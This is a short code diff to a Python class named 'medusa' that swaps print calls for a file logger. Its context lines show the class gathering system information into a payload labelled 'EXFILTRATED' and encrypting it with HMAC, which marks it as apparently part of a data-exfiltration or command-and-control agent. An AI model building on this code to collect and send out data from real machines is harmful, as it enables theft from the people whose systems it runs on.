@@ -18,9 +18,14 @@ import threading, queue
 import enc
 import time
 from hmac import new, compare_digest
+from utils import util
+from pathlib import Path
 
 
 CHUNK_SIZE = 51200
+
+# when move to custom place, need to change the path to locate logs folder
+logger = util.create_logger(Path.cwd().parent.parent.joinpath("logs", Path(__file__).name))
 
 
 class medusa:
@@ -112,7 +117,7 @@ class medusa:
         
         system_info = self.get_system_info()
         self.save_system_info_to_file(file_path, system_info)
-        print(f"System information saved to {file_path}")
+        logger.info(f"System information saved to {file_path}")
 
         data = {
             "EXFILTRATED ": system_info,
@@ -196,7 +201,7 @@ class medusa:
             hmac = new(key, iv + ciphertext, 'sha256').digest()
             return iv + ciphertext + hmac
         else:
-            print('data to encrypt', data)
+            logger.info('data to encrypt', data)
             return data
 
     def decrypt(self, data):
@@ -218,7 +223,7 @@ class medusa:
             else: 
                 return ""
         else: 
-            print('data to decrypt', data)
+            logger.info('data to decrypt', data)
             return data.decode()
 
 
